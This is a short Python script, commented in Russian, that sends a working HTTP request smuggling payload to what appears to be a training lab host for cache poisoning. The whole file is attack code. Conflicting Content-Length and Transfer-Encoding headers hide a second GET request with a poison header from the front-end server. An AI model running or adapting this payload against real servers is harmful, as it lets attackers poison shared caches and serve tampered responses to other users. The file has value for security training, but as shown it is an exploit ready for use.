
import socket

host = "lap3-http_request_smuggling_cache_poison.labs-is-here.online"
port = 80

# 1) front-end читает по Content-Length (13 байт)
# 2) back-end читает по Transfer-Encoding: chunked
#    → всё, что идёт после завершающего 0-чанка,
#      попадает на back-end как отдельный запрос
payload = (
    "POST /last_post HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 13\r\n"         # 13 байт «тела» для front-end
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"                          # 5 байт
    "\r\n"
    "XXXXXX\r\n"                     # 8 байт → 5+8 = 13
    "\r\n"
    "GET /last_post HTTP/1.1\r\n"    # <-- вторая просьба для back-end
    f"Host: {host}\r\n"
    "X-Smuggle-Poison: 1\r\n"
    "\r\n"
)

with socket.create_connection((host, port)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode(errors="ignore"))

